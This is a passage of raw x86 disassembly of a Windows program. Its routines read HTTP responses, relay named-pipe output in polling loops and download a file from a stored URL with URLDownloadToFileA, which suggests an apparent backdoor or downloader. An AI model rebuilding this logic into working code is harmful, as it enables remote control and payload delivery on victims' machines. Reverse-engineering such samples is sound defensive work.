                add     esp, 0Ch
                mov     [esp+18h], eax
                mov     [esp+1Ch], eax
                lea     eax, [esp+1Ch]
                push    eax
                lea     ecx, [esp+24h]
                push    ecx
                lea     edx, [esp+20h]
                push    edx
                push    20000005h
                push    ebp
                mov     [esp+34h], ebx
                call    edi ; HttpQueryInfoA
                test    eax, eax
                jz      short loc_4035B2
                mov     edi, ds:InternetQueryDataAvailable
                mov     ebx, ds:InternetReadFile
                nop

loc_403550:                             ; CODE XREF: .text:00403589↓j
                push    0
                push    0
                lea     eax, [esp+28h]
                push    eax
                push    ebp
                mov     dword ptr [esp+30h], 0
                call    edi ; InternetQueryDataAvailable
                test    eax, eax
                jz      short loc_403598
                mov     edx, [esp+20h]
                lea     ecx, [esp+28h]
                push    ecx
                push    edx
                lea     eax, [esp+esi+267Ch]
                push    eax
                push    ebp
                call    ebx ; InternetReadFile
                test    eax, eax
                jz      short loc_4035A6
                add     esi, [esp+28h]
                cmp     esi, [esp+18h]
                jb      short loc_403550
                jmp     short loc_4035B2
; ---------------------------------------------------------------------------

loc_40358D:                             ; CODE XREF: .text:00403413↑j
                                        ; .text:00403455↑j
                push    ebx
                call    sub_40F867
                add     esp, 4
                jmp     short loc_4035B2
; ---------------------------------------------------------------------------

loc_403598:                             ; CODE XREF: .text:00403566↑j
                call    ds:GetLastError
                mov     ecx, [esp+24h]
                mov     [ecx], eax
                jmp     short loc_4035B2
; ---------------------------------------------------------------------------

loc_4035A6:                             ; CODE XREF: .text:0040357F↑j
                call    ds:GetLastError
                mov     edx, [esp+24h]
                mov     [edx], eax

loc_4035B2:                             ; CODE XREF: .text:0040337A↑j
                                        ; .text:00403396↑j ...
                test    ebp, ebp
                jz      short loc_4035BD
                push    ebp
                call    ds:InternetCloseHandle

loc_4035BD:                             ; CODE XREF: .text:004034BD↑j
                                        ; .text:004035B4↑j
                mov     esi, 10h
                cmp     [esp+54h], esi
                jb      short loc_4035D5
                mov     eax, [esp+40h]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_4035D5:                             ; CODE XREF: .text:004035C6↑j
                mov     dword ptr [esp+54h], 0Fh
                mov     dword ptr [esp+50h], 0
                mov     byte ptr [esp+40h], 0
                cmp     [esp+70h], esi
                jb      short loc_4035FD
                mov     ecx, [esp+5Ch]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_4035FD:                             ; CODE XREF: .text:004035EE↑j
                xor     eax, eax
                mov     ecx, [esp+4E7Ch]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+4E60h]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 4E74h
                retn    4
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_403630      proc near               ; DATA XREF: sub_4067C0+187↓o

TotalBytesAvail = dword ptr -2838h
NumberOfBytesRead= dword ptr -2834h
var_2830        = byte ptr -2830h
var_282C        = dword ptr -282Ch
var_281C        = dword ptr -281Ch
var_2818        = dword ptr -2818h
Buffer          = byte ptr -2814h
var_2813        = byte ptr -2813h
var_14          = dword ptr -14h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_403630
                mov     eax, large fs:0
                push    eax
                mov     eax, 2830h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+283Ch+var_14], eax
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+2850h+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    ebx             ; lpName
                push    ebx             ; bInitialState
                push    1               ; bManualReset
                push    ebx             ; lpEventAttributes
                mov     [esp+2860h+TotalBytesAvail], ebx
                call    ds:CreateEventA
                mov     dword_42C338, eax
                mov     eax, hEvent
                push    ebx             ; dwMilliseconds
                push    eax             ; hHandle
                call    ds:WaitForSingleObject
                test    eax, eax
                jz      loc_4037B9
                mov     edi, ds:ReadFile
                mov     ebp, ds:EnterCriticalSection

loc_4036A6:                             ; CODE XREF: sub_403630+183↓j
                mov     ecx, dword_42C338
                push    ebx             ; dwMilliseconds
                push    ecx             ; hHandle
                call    ds:WaitForSingleObject
                test    eax, eax
                jz      loc_4037B9
                mov     eax, hFile
                push    ebx             ; lpBytesLeftThisMessage
                lea     edx, [esp+2854h+TotalBytesAvail]
                push    edx             ; lpTotalBytesAvail
                push    ebx             ; lpBytesRead
                push    ebx             ; nBufferSize
                push    ebx             ; lpBuffer
                push    eax             ; hNamedPipe
                call    ds:PeekNamedPipe
                test    eax, eax
                jz      loc_4037B9
                mov     esi, [esp+2850h+TotalBytesAvail]
                cmp     esi, ebx
                jnz     short loc_4036F1
                push    5DCh            ; dwMilliseconds
                call    ds:Sleep
                jmp     loc_4037A3
; ---------------------------------------------------------------------------

loc_4036F1:                             ; CODE XREF: sub_403630+AF↑j
                push    27FFh
                lea     ecx, [esp+2854h+var_2813]
                push    ebx
                push    ecx
                mov     [esp+285Ch+Buffer], bl
                call    sub_413520
                add     esp, 0Ch
                cmp     esi, 2800h
                jbe     short loc_403719
                mov     esi, 27F6h
                mov     [esp+2850h+TotalBytesAvail], esi

loc_403719:                             ; CODE XREF: sub_403630+DE↑j
                mov     ecx, hFile
                push    ebx             ; lpOverlapped
                lea     edx, [esp+2854h+NumberOfBytesRead]
                push    edx             ; lpNumberOfBytesRead
                push    esi             ; nNumberOfBytesToRead
                lea     eax, [esp+285Ch+Buffer]
                push    eax             ; lpBuffer
                push    ecx             ; hFile
                mov     [esp+2864h+NumberOfBytesRead], ebx
                call    edi ; ReadFile
                push    offset CriticalSection ; lpCriticalSection
                call    ebp ; EnterCriticalSection
                lea     eax, [esp+2850h+Buffer]
                mov     [esp+2850h+var_2818], 0Fh
                mov     [esp+2850h+var_281C], ebx
                mov     byte ptr [esp+2850h+var_282C], bl
                lea     edx, [eax+1]

loc_403750:                             ; CODE XREF: sub_403630+125↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_403750
                sub     eax, edx
                push    eax
                lea     edx, [esp+2854h+Buffer]
                push    edx
                lea     ecx, [esp+2858h+var_2830]
                call    sub_409840
                lea     eax, [esp+2850h+var_2830]
                push    eax
                mov     [esp+2854h+var_4], ebx
                call    sub_408F30
                mov     [esp+2850h+var_4], 0FFFFFFFFh
                cmp     [esp+2850h+var_2818], 10h
                jb      short loc_403798
                mov     ecx, [esp+2850h+var_282C]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_403798:                             ; CODE XREF: sub_403630+159↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection

loc_4037A3:                             ; CODE XREF: sub_403630+BC↑j
                mov     edx, hEvent
                push    ebx             ; dwMilliseconds
                push    edx             ; hHandle
                call    ds:WaitForSingleObject
                test    eax, eax
                jnz     loc_4036A6

loc_4037B9:                             ; CODE XREF: sub_403630+64↑j
                                        ; sub_403630+86↑j ...
                mov     eax, dword_42C338
                push    eax             ; hObject
                call    ds:CloseHandle
                mov     dword_42C338, ebx
                xor     eax, eax
                mov     ecx, [esp+2850h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+283Ch+var_14]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 283Ch
                retn    4
sub_403630      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_403800      proc near               ; DATA XREF: sub_406690+A6↓o

var_44C         = byte ptr -44Ch
var_448         = dword ptr -448h
var_438         = dword ptr -438h
var_434         = dword ptr -434h
var_430         = byte ptr -430h
var_42C         = dword ptr -42Ch
var_41C         = dword ptr -41Ch
var_418         = dword ptr -418h
var_414         = byte ptr -414h
var_413         = byte ptr -413h
var_14          = dword ptr -14h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_403800
                mov     eax, large fs:0
                push    eax
                sub     esp, 444h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+450h+var_14], eax
                push    ebx
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+458h+var_C]
                mov     large fs:0, eax
                push    offset szUrlName ; lpszUrlName
                call    ds:DeleteUrlCacheEntry
                xor     ebx, ebx
                push    ebx             ; LPBINDSTATUSCALLBACK
                push    ebx             ; DWORD
                push    offset byte_42BE98 ; LPCSTR
                push    offset szUrlName ; LPCSTR
                push    ebx             ; LPUNKNOWN
                call    URLDownloadToFileA
                cmp     eax, ebx
                jnz     short loc_4038AC
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                push    16h
                push    offset aUrlDownloadSuc ; "\nURL download success!"
                lea     ecx, [esp+460h+var_430]
                mov     [esp+460h+var_418], 0Fh
                mov     [esp+460h+var_41C], ebx
                mov     byte ptr [esp+460h+var_42C], bl
                call    sub_409840
                lea     eax, [esp+458h+var_430]
                push    eax
                mov     [esp+45Ch+var_4], ebx
                call    sub_408F30
                cmp     [esp+458h+var_418], 10h
                jb      loc_403941
                mov     ecx, [esp+458h+var_42C]
                push    ecx
                jmp     loc_403939
; ---------------------------------------------------------------------------

loc_4038AC:                             ; CODE XREF: sub_403800+59↑j
                push    3FFh
                lea     edx, [esp+45Ch+var_413]
                push    ebx
                push    edx
                mov     [esp+464h+var_414], bl
                call    sub_413520
                add     esp, 0Ch
                call    ds:GetLastError
                push    eax
                lea     eax, [esp+45Ch+var_414]
                push    offset aUrlDownloadFai ; "\nURL download failed with error code :"...
                push    eax
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+458h+var_414]
                mov     [esp+458h+var_434], 0Fh
                mov     [esp+458h+var_438], ebx
                mov     byte ptr [esp+458h+var_448], bl
                lea     edx, [eax+1]
                mov     edi, edi

loc_403900:                             ; CODE XREF: sub_403800+105↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_403900
                sub     eax, edx
                push    eax
                lea     ecx, [esp+45Ch+var_414]
                push    ecx
                lea     ecx, [esp+460h+var_44C]
                call    sub_409840
                lea     edx, [esp+458h+var_44C]
                push    edx
                mov     [esp+45Ch+var_4], 1
                call    sub_408F30
                cmp     [esp+458h+var_434], 10h
                jb      short loc_403941
                mov     eax, [esp+458h+var_448]
                push    eax

loc_403939:                             ; CODE XREF: sub_403800+A7↑j
                call    sub_40F15B
                add     esp, 4

loc_403941:                             ; CODE XREF: sub_403800+9C↑j
                                        ; sub_403800+132↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                xor     eax, eax
                mov     ecx, [esp+458h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     ebx
                mov     ecx, [esp+450h+var_14]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 450h
                retn    4
sub_403800      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_403980      proc near               ; DATA XREF: sub_406C90+2DA↓o

BytesRead       = dword ptr -2438h
NumberOfBytesRead= dword ptr -2434h
var_2430        = byte ptr -2430h
var_242C        = dword ptr -242Ch
var_241C        = dword ptr -241Ch
var_2418        = dword ptr -2418h
Buffer          = dword ptr -2414h
var_240C        = byte ptr -240Ch
var_14          = dword ptr -14h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_403980
                mov     eax, large fs:0
                push    eax
                mov     eax, 2430h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+243Ch+var_14], eax
                push    ebx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+2448h+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    23FFh
                lea     eax, [esp+244Ch+Buffer+1]
                push    ebx
                push    eax
                mov     [esp+2454h+NumberOfBytesRead], ebx
                mov     [esp+2454h+BytesRead], ebx
                mov     byte ptr [esp+2454h+Buffer], bl
                call    sub_413520
                add     esp, 0Ch
                push    ebx             ; lpName
                push    ebx             ; bInitialState
                push    1               ; bManualReset
                push    ebx             ; lpEventAttributes
                call    ds:CreateEventA
                mov     ecx, hEvent
                push    ebx             ; dwMilliseconds
                push    ecx             ; hHandle
                mov     dword_42BD94, eax
                call    ds:WaitForSingleObject
                test    eax, eax
                jz      loc_403B39
                mov     esi, ds:EnterCriticalSection
                lea     ebx, [ebx+0]

loc_403A10:                             ; CODE XREF: sub_403980+1A3↓j
                mov     edx, dword_42BD94
                push    ebx             ; dwMilliseconds
                push    edx             ; hHandle
                call    ds:WaitForSingleObject
                test    eax, eax
                jz      loc_403B39
                mov     edx, hObject
                push    ebx             ; lpBytesLeftThisMessage
                push    ebx             ; lpTotalBytesAvail
                lea     eax, [esp+2450h+BytesRead]
                push    eax             ; lpBytesRead
                push    2400h           ; nBufferSize
                lea     ecx, [esp+2458h+Buffer]
                push    ecx             ; lpBuffer
                push    edx             ; hNamedPipe
                call    ds:PeekNamedPipe
                test    eax, eax
                jz      loc_403B39
                cmp     [esp+2448h+BytesRead], ebx
                jnz     short loc_403A62
                push    7D0h            ; dwMilliseconds
                call    ds:Sleep
                jmp     loc_403B13
; ---------------------------------------------------------------------------

loc_403A62:                             ; CODE XREF: sub_403980+D0↑j
                push    2400h
                lea     eax, [esp+244Ch+Buffer]
                push    ebx
                push    eax
                call    sub_413520
                mov     eax, hObject
                add     esp, 0Ch
                push    ebx             ; lpOverlapped
                lea     ecx, [esp+244Ch+NumberOfBytesRead]
                push    ecx             ; lpNumberOfBytesRead
                push    2400h           ; nNumberOfBytesToRead
                lea     edx, [esp+2454h+Buffer]
                push    edx             ; lpBuffer
                push    eax             ; hFile
                call    ds:ReadFile
                test    eax, eax
                jz      loc_403B2B
                cmp     [esp+2448h+Buffer], 19h
                jnz     short loc_403B13
                push    offset CriticalSection ; lpCriticalSection
                call    esi ; EnterCriticalSection
                lea     eax, [esp+2448h+var_240C]
                mov     [esp+2448h+var_2418], 0Fh
                mov     [esp+2448h+var_241C], ebx
                mov     byte ptr [esp+2448h+var_242C], bl
                lea     edx, [eax+1]
                mov     edi, edi

loc_403AC0:                             ; CODE XREF: sub_403980+145↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_403AC0
                sub     eax, edx
                push    eax
                lea     ecx, [esp+244Ch+var_240C]
                push    ecx
                lea     ecx, [esp+2450h+var_2430]
                call    sub_409840
                lea     edx, [esp+2448h+var_2430]
                push    edx
                mov     [esp+244Ch+var_4], ebx
                call    sub_408F30
                mov     [esp+2448h+var_4], 0FFFFFFFFh
                cmp     [esp+2448h+var_2418], 10h
                jb      short loc_403B08
                mov     eax, [esp+2448h+var_242C]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_403B08:                             ; CODE XREF: sub_403980+179↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection

loc_403B13:                             ; CODE XREF: sub_403980+DD↑j
                                        ; sub_403980+11E↑j
                mov     ecx, hEvent
                push    ebx             ; dwMilliseconds
                push    ecx             ; hHandle
                call    ds:WaitForSingleObject
                test    eax, eax
                jnz     loc_403A10
                jmp     short loc_403B39
; ---------------------------------------------------------------------------

loc_403B2B:                             ; CODE XREF: sub_403980+113↑j
                call    ds:GetLastError
                push    1               ; dwMilliseconds
                call    ds:Sleep

loc_403B39:                             ; CODE XREF: sub_403980+7E↑j
                                        ; sub_403980+A0↑j ...
                mov     edx, dword_42BD94
                push    edx             ; hObject
                call    ds:CloseHandle
                mov     dword_42BD94, ebx
                xor     eax, eax
                mov     ecx, [esp+2448h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebx
                mov     ecx, [esp+243Ch+var_14]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 243Ch
                retn    4
sub_403980      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame fuzzy-sp

sub_403B80      proc near               ; CODE XREF: sub_401E10+FD↑p
                                        ; sub_402A00+3A0↑p

var_CF8         = dword ptr -0CF8h
var_CF4         = dword ptr -0CF4h
var_CE8         = dword ptr -0CE8h
var_CE4         = dword ptr -0CE4h
var_CE0         = dword ptr -0CE0h
var_CDC         = dword ptr -0CDCh
var_CD8         = byte ptr -0CD8h
var_CD7         = dword ptr -0CD7h
var_CD3         = dword ptr -0CD3h
var_CCF         = dword ptr -0CCFh
var_CCB         = word ptr -0CCBh
var_CC9         = byte ptr -0CC9h
var_CC8         = byte ptr -0CC8h
var_CC7         = byte ptr -0CC7h
var_C89         = byte ptr -0C89h
var_C88         = dword ptr -0C88h
var_C08         = byte ptr -0C08h
var_C07         = byte ptr -0C07h
var_808         = byte ptr -808h
var_807         = byte ptr -807h
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                push    ebp
                mov     ebp, esp
                and     esp, 0FFFFFFF8h
                sub     esp, 0CFCh
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+0CFCh+var_4], eax
                mov     eax, [ebp+arg_0]
                push    ebx
                push    esi
                push    edi
                push    7FFh
                xor     edi, edi
                lea     ecx, [esp+0D0Ch+var_807]
                push    edi
                push    ecx
                mov     [esp+0D14h+var_CF8], eax
                mov     [esp+0D14h+var_808], 0
                call    sub_413520
                add     esp, 0Ch
                push    3FFh
                lea     edx, [esp+0D0Ch+var_C07]
                push    edi
                push    edx
                mov     [esp+0D14h+var_C08], 0
                call    sub_413520
                xor     eax, eax
                add     esp, 0Ch
                push    3Fh
                mov     [esp+0D0Ch+var_CD7], eax
                mov     [esp+0D0Ch+var_CD3], eax
                mov     [esp+0D0Ch+var_CCF], eax
                mov     [esp+0D0Ch+var_CCB], ax
                mov     [esp+0D0Ch+var_CC9], al
                mov     [esp+0D0Ch+var_CC8], al
                lea     eax, [esp+0D0Ch+var_CC7]
                push    edi
                push    eax
                mov     [esp+0D14h+var_CD8], 0
                call    sub_413520
                add     esp, 0Ch
                push    7Fh
                lea     ecx, [esp+0D0Ch+var_C88+1]
                push    edi
                push    ecx
                mov     byte ptr [esp+0D14h+var_C88], 0
                call    sub_413520
                add     esp, 0Ch
                call    sub_40F139
                cdq
                mov     ecx, 0Ch
                idiv    ecx
                mov     eax, 66666667h
                mov     [esp+0D08h+var_C88], edi
                mov     ebx, edx
                imul    ebx
                sar     edx, 1
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                lea     edx, [eax+eax*4]
                mov     esi, ebx
                sub     esi, edx
                add     esi, 7
                jz      short loc_403C7D
                nop

loc_403C60:                             ; CODE XREF: sub_403B80+FB↓j
                call    sub_40F139
                xor     edx, edx
                mov     ecx, 3Fh
                div     ecx
                inc     edi
                mov     dl, ds:byte_422090[edx]
                mov     [esp+edi+0D08h+var_C89], dl
                cmp     edi, esi
                jb      short loc_403C60

loc_403C7D:                             ; CODE XREF: sub_403B80+DD↑j
                call    sub_40F139
                cdq
                mov     ecx, 7Fh
                idiv    ecx
                mov     eax, offset byte_42C768
                mov     edi, edx
                sub     edi, 0FFFFFF80h
                mov     [esp+0D08h+var_CDC], edi
                lea     edx, [eax+1]
                jmp     short loc_403CA0
; ---------------------------------------------------------------------------
                align 10h

loc_403CA0:                             ; CODE XREF: sub_403B80+11B↑j
                                        ; sub_403B80+125↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_403CA0
                sub     eax, edx
                push    edi
                mov     esi, eax
                lea     edi, [esp+0D0Ch+var_CC8]
                call    sub_404780
                mov     eax, [esp+0D0Ch+var_CDC]
                add     esp, 4
                push    0Ah
                lea     edx, [esp+0D0Ch+var_CD8]
                push    edx
                push    eax
                call    sub_41E398
                mov     ecx, dword_42C8C0
                sub     ecx, dword_42C8BC
                mov     eax, 2AAAAAABh
                imul    ecx
                sar     edx, 2
                mov     ecx, edx
                shr     ecx, 1Fh
                add     ecx, edx
                add     esp, 0Ch
                cmp     ebx, ecx
                jb      short loc_403CF2
                call    sub_40EC7A

loc_403CF2:                             ; CODE XREF: sub_403B80+16B↑j
                mov     eax, dword_42C8BC
                lea     edx, [ebx+ebx*2]
                lea     ecx, [eax+edx*8]
                lea     edx, [esp+0D08h+var_CF4]
                push    edx
                call    sub_408740
                mov     ecx, [esp+0D08h+var_CE4]
                mov     esi, [esp+0D08h+var_CE8]
                sub     ecx, esi
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                cmp     eax, 8
                ja      short loc_403D32
                call    sub_40EC7A
                mov     esi, [esp+0D08h+var_CE8]

loc_403D32:                             ; CODE XREF: sub_403B80+1A7↑j
                mov     edi, 10h
                cmp     [esi+0F8h], edi
                jb      short loc_403D47
                mov     esi, [esi+0E4h]
                jmp     short loc_403D4D
; ---------------------------------------------------------------------------

loc_403D47:                             ; CODE XREF: sub_403B80+1BD↑j
                add     esi, 0E4h

loc_403D4D:                             ; CODE XREF: sub_403B80+1C5↑j
                push    offset szProxyBypass
                lea     ecx, [esp+0D0Ch+var_CD8]
                push    ecx
                lea     edx, [esp+0D10h+var_CC8]
                push    edx
                lea     eax, [esp+0D14h+var_C88]
                push    eax
                lea     ecx, [esp+0D18h+var_C08]
                push    esi
                push    ecx
                call    sub_40E37C
                mov     ecx, [esp+0D20h+var_CE4]
                mov     ebx, [esp+0D20h+var_CE8]
                sub     ecx, ebx
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     esp, 18h
                add     eax, edx
                jnz     short loc_403D9D
                call    sub_40EC7A
                mov     ebx, [esp+0D08h+var_CE8]

loc_403D9D:                             ; CODE XREF: sub_403B80+212↑j
                cmp     [ebx+18h], edi
                jb      short loc_403DA7
                mov     eax, [ebx+4]
                jmp     short loc_403DAA
; ---------------------------------------------------------------------------

loc_403DA7:                             ; CODE XREF: sub_403B80+220↑j
                lea     eax, [ebx+4]

loc_403DAA:                             ; CODE XREF: sub_403B80+225↑j
                mov     esi, eax
                lea     esp, [esp+0]

loc_403DB0:                             ; CODE XREF: sub_403B80+235↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_403DB0
                lea     edi, [esp+0D08h+var_808]
                sub     eax, esi
                dec     edi

loc_403DC1:                             ; CODE XREF: sub_403B80+247↓j
                mov     cl, [edi+1]
                inc     edi
                test    cl, cl
                jnz     short loc_403DC1
                mov     ecx, eax
                shr     ecx, 2
                rep movsd
                mov     ecx, eax
                and     ecx, 3
                rep movsb
                mov     ecx, [esp+0D08h+var_CE4]
                sub     ecx, ebx
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     ecx, edx
                shr     ecx, 1Fh
                add     ecx, edx
                cmp     ecx, 1
                ja      short loc_403DFE
                call    sub_40EC7A
                mov     ebx, [esp+0D08h+var_CE8]

loc_403DFE:                             ; CODE XREF: sub_403B80+273↑j
                cmp     dword ptr [ebx+34h], 10h
                jb      short loc_403E09
                mov     eax, [ebx+20h]
                jmp     short loc_403E0C
; ---------------------------------------------------------------------------

loc_403E09:                             ; CODE XREF: sub_403B80+282↑j
                lea     eax, [ebx+20h]

loc_403E0C:                             ; CODE XREF: sub_403B80+287↑j
                mov     edx, eax
                mov     edi, edi

loc_403E10:                             ; CODE XREF: sub_403B80+295↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_403E10
                lea     edi, [esp+0D08h+var_808]
                sub     eax, edx
                dec     edi

loc_403E21:                             ; CODE XREF: sub_403B80+2A7↓j
                mov     cl, [edi+1]
                inc     edi
                test    cl, cl
                jnz     short loc_403E21
                mov     ecx, eax
                shr     ecx, 2
                mov     esi, edx
                rep movsd
                mov     ecx, eax
                and     ecx, 3
                lea     eax, [esp+0D08h+var_C08]
                rep movsb
                mov     ecx, eax

loc_403E42:                             ; CODE XREF: sub_403B80+2C7↓j
                mov     dl, [eax]
                inc     eax
                test    dl, dl
                jnz     short loc_403E42
                lea     edi, [esp+0D08h+var_808]
                sub     eax, ecx
                mov     esi, ecx
                dec     edi

loc_403E55:                             ; CODE XREF: sub_403B80+2DB↓j
                mov     cl, [edi+1]
                inc     edi
                test    cl, cl
                jnz     short loc_403E55
                mov     ecx, eax
                shr     ecx, 2
                rep movsd
                mov     ecx, eax
                and     ecx, 3
                lea     eax, [esp+0D08h+var_808]
                rep movsb
                lea     edx, [eax+1]

loc_403E75:                             ; CODE XREF: sub_403B80+2FA↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_403E75
                sub     eax, edx
                mov     edi, eax
                mov     eax, [ebp+arg_4]
                cmp     edi, eax
                jb      short loc_403EDD
                xor     esi, esi
                cmp     ebx, esi
                jz      short loc_403EAD
                mov     edx, [esp+0D08h+var_CF8]
                mov     edi, [esp+0D08h+var_CE4]
                push    edx
                mov     eax, ebx
                call    sub_40B200
                mov     eax, [esp+0D0Ch+var_CE8]
                add     esp, 4
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_403EAD:                             ; CODE XREF: sub_403B80+30B↑j
                mov     ecx, [esp+0D08h+var_CF4]
                push    ecx
                mov     [esp+0D0Ch+var_CE8], esi
                mov     [esp+0D0Ch+var_CE4], esi
                mov     [esp+0D0Ch+var_CE0], esi
                call    sub_40F15B
                add     esp, 4
                xor     eax, eax
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [esp+0CFCh+var_4]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_403EDD:                             ; CODE XREF: sub_403B80+305↑j
                mov     esi, [esp+0D08h+var_CF8]
                push    eax
                xor     ebx, ebx
                push    ebx
                push    esi
                call    sub_413520
                lea     eax, [esp+0D14h+var_808]
                mov     edx, esi
                mov     ecx, eax
                add     esp, 0Ch
                sub     edx, ecx
                jmp     short loc_403F00
; ---------------------------------------------------------------------------
                align 10h

loc_403F00:                             ; CODE XREF: sub_403B80+37B↑j
                                        ; sub_403B80+388↓j
                mov     cl, [eax]
                mov     [edx+eax], cl
                inc     eax
                test    cl, cl
                jnz     short loc_403F00
                mov     eax, [esp+0D08h+var_CE8]
                mov     [esi+edi], cl
                cmp     eax, ebx
                jz      short loc_403F33
                mov     edx, [esp+0D08h+var_CF8]
                mov     edi, [esp+0D08h+var_CE4]
                push    edx
                call    sub_40B200
                mov     eax, [esp+0D0Ch+var_CE8]
                add     esp, 4
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_403F33:                             ; CODE XREF: sub_403B80+393↑j
                mov     ecx, [esp+0D08h+var_CF4]
                push    ecx
                mov     [esp+0D0Ch+var_CE8], ebx
                mov     [esp+0D0Ch+var_CE4], ebx
                mov     [esp+0D0Ch+var_CE0], ebx
                call    sub_40F15B
                mov     ecx, [esp+0D0Ch+var_4]
                add     esp, 4
                pop     edi
                pop     esi
                pop     ebx
                xor     ecx, esp
                mov     eax, 1
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     esp, ebp
                pop     ebp
                retn
sub_403B80      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_403F70      proc near               ; CODE XREF: sub_404110+B↓p
                                        ; sub_404110+1D↓p ...

var_44          = dword ptr -44h
var_38          = dword ptr -38h
var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = byte ptr -2Ch
var_28          = dword ptr -28h
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    0FFFFFFFFh
                push    offset SEH_403F70
                mov     eax, large fs:0
                push    eax
                sub     esp, 3Ch
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+58h+var_C]
                mov     large fs:0, eax
                mov     edi, ecx
                push    4
                call    sub_40F94F
                xor     ecx, ecx
                add     esp, 4
                cmp     eax, ecx
                jz      short loc_403FB0
                lea     edx, [esp+58h+var_44]
                mov     [eax], edx
                jmp     short loc_403FB2
; ---------------------------------------------------------------------------

loc_403FB0:                             ; CODE XREF: sub_403F70+36↑j
                xor     eax, eax

loc_403FB2:                             ; CODE XREF: sub_403F70+3E↑j
                mov     [esp+58h+var_44], eax
                mov     [esp+58h+var_38], ecx
                mov     [esp+58h+var_34], ecx
                mov     [esp+58h+var_30], ecx
                mov     [esp+58h+var_4], 1
                mov     eax, edi
                mov     [esp+58h+var_14], 0Fh
                mov     [esp+58h+var_18], ecx
                mov     byte ptr [esp+58h+var_28], cl
                lea     esi, [eax+1]
                nop

loc_403FE0:                             ; CODE XREF: sub_403F70+75↓j
                mov     dl, [eax]
                inc     eax
                cmp     dl, cl
                jnz     short loc_403FE0
                sub     eax, esi
                push    eax
                push    edi
                lea     ecx, [esp+60h+var_2C]
                call    sub_409840
                lea     eax, [esp+58h+var_2C]
                push    eax
                lea     ebx, [esp+5Ch+var_44]
                mov     byte ptr [esp+5Ch+var_4], 2
                call    sub_408850
                mov     byte ptr [esp+58h+var_4], 1
                cmp     [esp+58h+var_14], 10h
                jb      short loc_404020
                mov     ecx, [esp+58h+var_28]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_404020:                             ; CODE XREF: sub_403F70+A1↑j
